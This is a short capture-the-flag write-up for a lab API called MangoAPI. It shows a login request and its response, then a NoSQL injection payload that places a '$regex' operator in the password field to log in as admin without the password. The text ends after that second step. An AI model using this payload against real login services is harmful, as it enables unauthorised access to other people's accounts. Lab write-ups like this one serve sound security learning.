What we know from the challenge:
`POST /api/login`

    Log in and receive a user's authorization token
    Request requires the parameters: username and password
    Request accepts parameters in a JSON body
    Request requires the header Content-Type: application/json

For testing purposes, MangoAPI provisioned you an account with the credentials `pentest:pentest.`

1)We can start by loggin in with infos we are given
```
POST /api/login HTTP/1.1
Host: 83.136.254.199:48170

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

{"username":"pentest","password":"pentest"}


Result in the following response:
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 110

{"success":true,"username":"pentest","role":"user","token":"NTM2NjViM2lqYjUya2pxMzQ2NDV3Nm40MzU2bjQzNTYyCg=="}
```


2)Now as I see the username is the one that is reflected into the response so I guess we need to use that in order to ex-filtrate the flag? So I tried to play around and seems like the username is not important but what is important is
the password field! So guessing that we are looking for the user=admin we can send something similar:
```
{
	"username":"admin",
	"password":{"$regex":"^.*"} 
}
```
This will match all the records and effectively bypass the password field!
